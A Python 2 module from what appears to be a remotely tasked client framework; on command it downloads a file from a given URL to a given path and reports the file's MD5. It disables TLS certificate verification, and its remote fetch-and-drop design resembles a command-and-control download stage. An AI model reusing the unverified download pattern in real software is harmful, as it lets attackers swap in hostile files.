from GC_CModule import GC_CModule
import GC_Utility
import urllib2
import hashlib
import os
import shutil
import ssl

class GC_CModule_DownloadFile(GC_CModule):
	MODULE_ID = 'download'
	
	def __init__(self, gcclient):
		self.gcclient = gcclient

	def handleTask(self, gccommand) :
		self.gcclient.log(GC_Utility.DEBUG, "handleTask :: [x] " + gccommand[GC_Utility.GC_TASKREF])
		
		startTime =  GC_Utility.currentZuluDT()
		
		taskingObj = gccommand[GC_Utility.GC_CMD_DATA]
		
		response = {}
		response['startTime'] = startTime
		
		self.gcclient.log(GC_Utility.DEBUG, 'downloadFile: [%s as %s]' % (taskingObj['url'], taskingObj['saveas']))
		
		# Check for existing file, move it to back up
		GC_Utility.handleBackup(taskingObj['saveas'])
		
		# Download the file
		try:
			context = ssl._create_unverified_context()
			f = urllib2.urlopen(taskingObj['url'], context=context)
			data = f.read()
			with open(taskingObj['saveas'], "wb") as code:
				code.write(data)
		
			# Send the file hash back
			response['MD5'] = hashlib.md5(open(taskingObj['saveas'], 'rb').read()).hexdigest()
		except urllib2.HTTPError as e:
			response['ERROR'] = "HTTP Error " + unicode(e.code)
		
		self.gcclient.log(GC_Utility.DEBUG, 'downloadFile : Sending result...');
		self.gcclient.sendResult(gccommand, response);
	
	def getModuleId(self):
		return self.MODULE_ID
	
	def quit(self):
		return True
